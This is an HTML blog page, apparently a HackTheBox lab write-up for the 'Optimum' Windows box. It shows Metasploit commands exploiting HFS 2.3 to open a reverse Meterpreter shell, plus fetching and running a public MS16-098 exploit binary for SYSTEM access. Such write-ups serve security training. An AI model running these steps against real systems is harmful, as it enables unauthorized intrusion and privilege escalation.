@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="en">
+<title>HackTheBox - Optimum | Active Denial System</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Summary Optium is a fairly straightforward easy rated Windows box. It involves simple enumeration and exploitation via a readily available metasploit module ...">
+<meta name="author" content="wittr">
+<meta name="generator" content="Jekyll v4.1.1">
+<link rel="canonical" href="http://localhost:4000/writeups/2020/07/20/HTB-Optimum.html">
+
+<link rel="stylesheet" href="/assets/css/index.css">
+
+<link rel="stylesheet" href="/assets/css/classes.css">
+
+<link rel="alternate" href="/feed.xml" type="application/atom+xml" title="Active Denial System">
+
+
+
+
+<header class="icons">
+  
+    <a href="/" class="title">Active Denial System</a>
+  
+  
+    
+  <nav>
+  <a aria-label="Home" href="/" ><span aria-hidden="true" >Home</span></a>
+  <a aria-label="About" href="/about/" ><span aria-hidden="true" >About</span></a>
+  <a aria-label="Subjects" href="/subjects/" ><span aria-hidden="true" >Subjects</span></a>
+  <a aria-label="Archive" href="/archive/" ><span aria-hidden="true" >Archive</span></a>
+  
+  </nav>
+
+
+    
+  <nav>
+  <a aria-label="Twitter" href="https://twitter.com/rivenlogik" ><svg aria-hidden="true" ><use xlink:href="/assets/fontawesome/icons.svg#twitter"></use></svg></a>
+  <a aria-label="Github" href="https://github.com/rivenlogik" ><svg aria-hidden="true" ><use xlink:href="/assets/fontawesome/icons.svg#github"></use></svg></a>
+  <a aria-label="HackTheBox" href="https://www.hackthebox.eu/home/users/profile/33864" ><svg aria-hidden="true" ><use xlink:href="/assets/fontawesome/icons.svg#cube"></use></svg></a>
+  <a aria-label="Subscribe" href="/feed.xml" ><svg aria-hidden="true" ><use xlink:href="/assets/fontawesome/icons.svg#rss"></use></svg></a>
+  
+  </nav>
+
+
+  
+  
+</header>
+
+<article>
+  <header><h1><a href="/writeups/2020/07/20/HTB-Optimum.html">HackTheBox - Optimum</a></h1></header>
+  <p><img src="/assets/images/HTBoxes/Optimum/Optimum.png" alt="Optimum" /></p>
+<h2 id="summary">Summary</h2>
+
+<p>Optium is a fairly straightforward easy rated Windows box.  It involves simple enumeration and exploitation via a readily available metasploit module for a foothold.  For privilege escalation, it requires enumeration of patch levels of the system to determine a relevant exploit for escalation.</p>
+
+<h2 id="walkthrough">Walkthrough</h2>
+
+<h3 id="enumeration">Enumeration</h3>
+
+<p>Ran the usual nmap <code class="language-plaintext highlighter-rouge">nmap -A -T4 -v 10.10.10.8</code></p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">PORT   STATE SERVICE VERSION
+80/tcp open  http    HttpFileServer httpd 2.3
+|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
+| http-methods:
+|_  Supported Methods: GET HEAD POST
+|_http-server-header: HFS 2.3
+|_http-title: HFS /
+</span><span class="gp">Service Info: OS: Windows;</span><span class="w"> </span>CPE: cpe:/o:microsoft:windows
+</code></pre></div></div>
+
+<p>I went to the website and saw it is running <a href="https://www.rejetto.com/hfs/">HTTP File Server software</a> v2.3.</p>
+
+<p><img src="/assets/images/HTBoxes/Optimum/optimum-website.png" alt="Optimum-website" /></p>
+
+<p>I did a <code class="language-plaintext highlighter-rouge">searchsploit hfs</code> and found this version seems to be vulnerable.</p>
+
+<h3 id="foothold">Foothold</h3>
+
+<p>I loaded up msfconsole via <code class="language-plaintext highlighter-rouge">msfconsole -q</code> and found that there is a RCE metasploit module that we can use to gain a foothold.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">msf5 &gt;</span><span class="w"> </span>search hfs
+<span class="go">
+Matching Modules
+================
+
+</span><span class="gp">   #</span><span class="w">  </span>Name                                        Disclosure Date  Rank       Check  Description
+<span class="go">   -  ----                                        ---------------  ----       -----  -----------
+   0  exploit/multi/http/git_client_command_exec  2014-12-18       excellent  No     Malicious Git and Mercurial HTTP Server For CVE-2
+014-9390
+   1  exploit/windows/http/rejetto_hfs_exec       2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution
+
+
+</span><span class="gp">msf5 &gt;</span><span class="w"> </span>use exploit/windows/http/rejetto_hfs_exec
+<span class="gp">msf5 exploit(windows/http/rejetto_hfs_exec) &gt;</span><span class="w"> </span>show options
+<span class="go">
+Module options (exploit/windows/http/rejetto_hfs_exec):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   HTTPDELAY  10               no        Seconds to wait before terminating web server
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+</span><span class="gp">   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;</span><span class="s1">'
+</span><span class="go">   RPORT      80               yes       The target port (TCP)
+   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT    8080             yes       The local port to listen on.
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
+   TARGETURI  /                yes       The path of the web application
+   URIPATH                     no        The URI to use for this exploit (default is random)
+   VHOST                       no        HTTP server virtual host
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+</span><span class="gp">msf5 exploit(windows/http/rejetto_hfs_exec) &gt;</span><span class="w"> </span><span class="nb">set </span>RHOSTS 10.10.10.8
+<span class="gp">RHOSTS =&gt;</span><span class="w"> </span>10.10.10.8
+<span class="gp">msf5 exploit(windows/http/rejetto_hfs_exec) &gt;</span><span class="w"> </span><span class="nb">set </span>SRVHOST 10.10.14.2
+<span class="gp">SRVHOST =&gt;</span><span class="w"> </span>10.10.14.2
+<span class="gp">msf5 exploit(windows/http/rejetto_hfs_exec) &gt;</span><span class="w"> </span>exploit
+<span class="go">
+[*] Started reverse TCP handler on 10.10.14.2:4444
+[*] Using URL: http://10.10.14.2:8080/Kzl4K6JceE
+[*] Server started.
+[*] Sending a malicious request to /
+/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
+/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
+[*] Payload request received: /Kzl4K6JceE
+[*] Sending stage (176195 bytes) to 10.10.10.8
+</span><span class="gp">[*] Meterpreter session 1 opened (10.10.14.2:4444 -&gt;</span><span class="w"> </span>10.10.10.8:49162<span class="o">)</span> at 2020-07-20 21:32:54 <span class="nt">-0500</span>
+<span class="go">[!] Tried to delete %TEMP%\ytefKHKvAX.vbs, unknown result
+[*] Server stopped.
+
+</span><span class="gp">meterpreter &gt;</span><span class="w"> </span>getuid
+<span class="go">Server username: OPTIMUM\kostas
+</span></code></pre></div></div>
+
+<h3 id="user">User</h3>
+
+<p>I listed the kostas desktop folder and there was a user.txt.  No need to pivot so I grabbed the user.txt sitting in the Desktop folder.</p>
+
+<h3 id="root">Root</h3>
+
+<p>Now that I had user it was time to enumerate to find a path to admin.  I used the windows exploit suggester <a href="https://github.com/GDSSecurity/Windows-Exploit-Suggester">tool</a>.</p>
+
+<p>To gather the systeminfo for it I just used the meterpreter session:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">meterpreter &gt;</span><span class="w"> </span>execute <span class="nt">-f</span> cmd.exe <span class="nt">-a</span> <span class="s2">"/c systeminfo &gt; systeminfo.txt"</span>
+<span class="go">Process 2072 created.
+</span><span class="gp">meterpreter &gt;</span><span class="w"> </span><span class="nb">dir</span>
+<span class="go">Listing: C:\Users\kostas\Desktop
+================================
+
+Mode              Size    Type  Last modified              Name
+----              ----    ----  -------------              ----
+40777/rwxrwxrwx   0       dir   2020-07-27 06:31:27 -0500  %TEMP%
+100666/rw-rw-rw-  282     fil   2017-03-18 06:57:16 -0500  desktop.ini
+100777/rwxrwxrwx  760320  fil   2014-02-16 05:58:52 -0600  hfs.exe
+100666/rw-rw-rw-  3334    fil   2020-07-27 07:16:36 -0500  systeminfo.txt
+100444/r--r--r--  32      fil   2017-03-18 07:13:18 -0500  user.txt.txt
+
+</span><span class="gp">meterpreter &gt;</span><span class="w"> </span>download systeminfo.txt
+<span class="gp">[*] Downloading: systeminfo.txt -&gt;</span><span class="w"> </span>systeminfo.txt
+<span class="gp">[*] Downloaded 3.26 KiB of 3.26 KiB (100.0%): systeminfo.txt -&gt;</span><span class="w"> </span>systeminfo.txt
+<span class="gp">[*] download   : systeminfo.txt -&gt;</span><span class="w"> </span>systeminfo.txt
+</code></pre></div></div>
+
+<p>To get the script to run, it requires python2 and a library dependency.  I suggest using <code class="language-plaintext highlighter-rouge">pipenv</code> in the cloned folder.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">pipenv --python 2.7
+pipenv install xlrd
+pipenv run python2 ./windows-exploit-suggester.py --database 2020-07-20-mssb.xls --systeminfo systeminfo.txt
+</span></code></pre></div></div>
+
+<p>After executing the script, there’s quite a few suggestions.  The one in the official HTB writeup is MS016-032.  However, I had issues trying to get it to work from metasploit.  After some googling I decided to try MS16-098.</p>
+
+<p><code class="language-plaintext highlighter-rouge">wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe</code></p>
+
+<p>Back in my meterpreter session I did a <code class="language-plaintext highlighter-rouge">upload 41020.exe</code> then opened a shell to execute it.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">meterpreter &gt;</span><span class="w"> </span>shell
+<span class="go">Process 2336 created.
+Channel 5 created.
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+</span><span class="gp">C:\Users\kostas\Desktop&gt;</span>.<span class="se">\4</span>1020.exe
+<span class="go">.\41020.exe
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+</span><span class="gp">C:\Users\kostas\Desktop&gt;</span><span class="nb">whoami</span>
+<span class="go">whoami
+nt authority\system
+</span></code></pre></div></div>
+
+<p>After this I simply went to the Desktop directory and grabbed the root.txt flag.</p>
+
+<h2 id="lessons-learned">Lessons Learned</h2>
+
+<p>On this box:</p>
+
+<ul>
+  <li>Refreshed metasploit module searching and exploit execution</li>
+  <li>Learned about a new python based windows priv esc tool (the suggester tool)</li>
+</ul>
+
+</article>
+
+
+</html>
